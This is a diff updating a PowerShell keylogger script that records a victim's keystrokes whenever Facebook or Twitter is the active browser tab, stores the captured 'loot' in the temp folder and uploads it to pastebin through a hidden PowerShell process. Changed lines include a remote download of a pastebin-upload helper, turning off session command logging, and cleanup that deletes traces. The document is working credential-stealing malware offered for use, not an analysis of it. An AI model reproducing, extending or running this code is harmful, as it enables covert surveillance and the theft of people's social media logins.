@@ -6,39 +6,33 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: Get-Process,mscore.ps1
    Optional Dependencies: UserLand
-   PS cmdlet Dev version: v1.5.14
+   PS cmdlet Dev version: v1.5.15
    
 .DESCRIPTION
-   Start recording keystrokes (loop) if target has
+   Start recording keyboard keystrokes if target has
    facebook or twitter in the 'active browser tab'
 
 .NOTES
-   Browsers supported: MsEdge,Chrome,Chromium,Opera,Safari,Firefox
+   Browsers supported: MsEdge,Chrome,Chromium,Opera,Safari,Firefox.
    Multiple logfiles will be saved under target %TMP% directory with
    the names 1_[random].Facebook OR 1_[random].Twitter [extensions]
 
-   This cmdlet starts recording keystrokes if the target has facebook
+   This cmdlet starts recording keystrokes if target user has facebook
    or twitter in the 'active tab' and stops recording whenever it detects
    the exit of the social media tab. in that case it stops the key`logger
    process, renames the logfile (loot) and waits for the social media to
    be accessed again to start recording or to be told to stop recording.
 
-   This cmdlet execution can be schedule to start at [HH:mm] hours.
+   1200 milliseconds (default) is the amount of time required for key`logger
+   to start execution and build pid.log file. If we chose to use less than 1
+   second delay then cmdlet executes more than one instance of powershell.
+   [ALL PIDs started previous, will be stoped by this cmdlet automatic]
 
+   [SEND_TO_PASTEBIN]
    Remark: pastebin webserver only accepts 20 pastes per day! (free account)
-   Remark: SendToPasteBin function sends loots to pastebin in 3 diferent ways:
-   1 - The target user switchs from FB tab to a diferent tab (not social media)
-   2 - The terminal console recives a CTRL+C command (to exit cmdlet execution)
-   3 - The target browser is suddenly closed (cmdlet waits browser to restart)
-
-   [trick: force 'SendToPasteBin' to run before leak captures]
-   start https://elgoog.im/pacman;.\socialmedia.ps1 -mode stop
-
-   1200 milliseconds (default) its the amount of time required for
-   key`loger to start execution and build pid.log file. If we chose
-   to use less than 1 second delay then cmdlet executes more than
-   one instance of powershell (all PIDs will be stoped in the end)
-   and that will allow us to have more changes to capture logins.
+   Remark: SendToPasteBin function sends loot's to pastebin in 2 diferent ways:
+   1 - Target user switchs from facebook tab to a diferent tab => SendToPasteBin
+   2 - Browser closes (key`logger waits for browser to restart) => SendToPasteBin
 
 .Parameter Mode
    Start or Stop key`logger (default: start)
@@ -126,7 +120,8 @@
 
 
 Clear-Host
-$CmdletVersion = "v1.5.14"
+$CmdletVersion = "v1.5.15"
+$IPath = (Get-Location).Path
 $CurrentTime = (Get-Date -Format 'HH:mm')
 $ErrorActionPreference = "SilentlyContinue"
 ## Disable Powershell Command Logging for current session.
@@ -309,15 +304,14 @@ function Invoke-SendToPasteBin ()
       Helper - 🔥 Send loot(s) to pastebin website 🔥
 
    .DESCRIPTION
-      Pastebin_Title_Example: SKYNET_Facebook_16_44_23
+      Pastebin_Title_Example: Facebook_adsufh
       Remark: pastebin webserver only accepts 20 pastes per day! (free account)
-      Remark: SendToPasteBin function sends loots to pastebin in 3 diferent ways:
-      1 - The target user switchs from FB tab to a diferent tab (not social media)
-      2 - The terminal console recives a CTRL+C command (to exit cmdlet execution)
-      3 - The target browser is suddenly closed (cmdlet waits browser to restart)
+      Remark: SendToPasteBin function sends loot's to pastebin in 2 diferent ways:
+      1 - Target user switchs from facebook tab to a diferent tab => SendToPasteBin
+      2 - Browser closes (key`logger waits for browser to restart) => SendToPasteBin
 
-      [trick][force 'SendToPasteBin' to run before leak captures]
-      start https://elgoog.im/pacman;.\socialmedia.ps1 -mode stop
+      Hint: force 'SendToPasteBin' function to run before leaking captures.
+      Example: start https://elgoog.im/pacman;.\socialmedia.ps1 -mode stop
    #>
 
    If(-not(Test-Path -Path "$PasteThisFile" -EA SilentlyContinue))
@@ -325,15 +319,15 @@ function Invoke-SendToPasteBin ()
       $PasteThisFile = "$Env:TMP\void.log"
    }
 
-   If([bool](Test-Path -Path "$Env:TMP\SendToPasteBin.ps1") -match '^(True)$')
+   If([bool](Test-Path -Path "$Env:TMP\Out-Pastebin.ps1") -match '^(True)$')
    {
-      $PasteTimes = (Get-Date -Format 'HH_mm_ss')
-      $PasteTitle = "${Env:COMPUTERNAME}_${SocialSite}"
+      $RandomName = -join ((97..122)|Get-Random -Count 6|%{[char]$_})
       write-host "  ╰➤ 📮 Sending loot to pastebin webserver." -ForegroundColor Blue
       write-host "`n  Paste number          : $Counter"
 
       If($Counter -lt 20) ## <- MAX number of pastes allowed by pastebin per day
       {
+         $PasteTitle = "$SocialSite"+"_"+"$RandomName" -join ''
          write-host "  Pastebin username     : $PastebinUsername"
          write-host "  Pastebin password     : $PastebinPassword"
          write-host "  Pastebin developerKey : " -NoNewline
@@ -341,11 +335,15 @@ function Invoke-SendToPasteBin ()
          write-host "  Pastebin account Url  : " -NoNewline
          write-host "https://pastebin.com/u/$PasteBinUserName" -ForegroundColor Green
          write-host "  Send to pastebin      : $PasteThisFile"
-         write-host "  Pastebin filename     : ${PasteTitle}_${PasteTimes}`n"
+         write-host "  Pastebin filename     : $PasteTitle`n"
 
-         ## Execute sendtopastebin cmdlet in a hidden console detach from parent process [SocialMedia process pid]
-         Start-Process -WindowStyle hidden powershell -ArgumentList "-file $Env:TMP\SendToPasteBin.ps1 -PastebinUsername $PastebinUsername -PastebinPassword $PastebinPassword -PastebinDeveloperKey $PastebinDeveloperKey -PasteTitle $PasteTitle -filepath $PasteThisFile -Egg true`"";
-         Start-Sleep -Seconds 5;write-host "  🎖️ Loot file deliver to pastebin server!" -ForegroundColor Blue;Start-Sleep -Seconds 2
+         cd $Env:TMP
+         $RawData = (Get-Content -Path "$PasteThisFile" -EA SilentlyContinue)
+         ## Execute Out-PasteBin cmdlet in a hidden console detach from parent process [SocialMedia process pid]
+         Start-Process -WindowStyle Hidden powershell -ArgumentList "Import-Module .\Out-PasteBin.ps1 -Force;Out-Pastebin -InputObject '$RawData' -PasteTitle '$PasteTitle' -ExpiresIn 1W -Visibility Private -PastebinUsername '$PastebinUsername' -PastebinPassword '$PastebinPassword' -PastebinDeveloperKey '$PastebinDeveloperKey'"
+         Start-Sleep -Seconds 5;write-host "  🎖️ Loot file deliver to pastebin server!" -ForegroundColor Blue
+         Start-Sleep -Seconds 2
+         cd $IPath
       }
       Else
       {
@@ -447,7 +445,7 @@ If($Mode -iMatch '^(start)$')
 
    If($SendToPasteBin.IsPresent)
    {
-      iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/SendToPasteBin.ps1" -OutFile "$Env:TMP\SendToPasteBin.ps1"|Unblock-File
+      iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Out-Pastebin.ps1" -OutFile "$Env:TMP\Out-Pastebin.ps1"|Unblock-File
    }
 
    echo "`n"
@@ -506,31 +504,6 @@ If($Mode -iMatch '^(start)$')
                ## Key`logger running -- backup void.log logfile
                write-host "  💀 Key`logger running in background!"
                Get-Content -Path "$Env:TMP\void.log" -EA SilentlyContinue|Out-File "$Env:TMP\AUTO_BACKUP.${SocialSite}" -force
-
-               If($SendToPasteBin.IsPresent)
-               {
-                  <#
-                  .SYNOPSIS
-                     Author: @r00t-3xp10it
-                     Helper - Send loot to pastebin if [CTRL+C] is invoked.  
-                  #>
-
-                  [console]::treatcontrolcasinput = $true
-                  If([console]::keyavailable)
-                  {
-                     $key = [system.console]::readkey($true)
-                     If(($key.modifiers -band [consolemodifiers]"control") -and ($key.key -eq "c"))
-                     {
-                        [int]$Counter = [int]$Counter+1
-                        $PasteThisFile = "$Env:TMP\void.log"
-                        write-host "  ╰➤ 🔥 Abort: Console detected CTRL+C command 🔥" -ForegroundColor Red
-
-                        ## Send-To-PasteBin
-                        Invoke-SendToPasteBin
-                        echo "";exit ## Exit cmdlet
-                     }
-                  }
-               }
 
             }
             Else
@@ -639,7 +612,6 @@ If($Mode -iMatch '^(stop)$')
       ## CleanUP
       Remove-Item -Path "$Env:TMP\*.log" -Force
       Remove-Item -Path "$Env:TMP\Out-Pastebin.ps1" -Force
-      Remove-Item -Path "$Env:TMP\SendToPasteBin.ps1" -Force
       Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Twitter" -Force
       Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Facebook" -Force
    }
@@ -653,5 +625,4 @@ If($Mode -iMatch '^(stop)$')
 ## CleanUP
 Remove-Item -Path "$Env:TMP\mscore.ps1" -Force
 Remove-Item -Path "$Env:TMP\Out-Pastebin.ps1" -Force
-Remove-Item -Path "$Env:TMP\SendToPasteBin.ps1" -Force
 exit
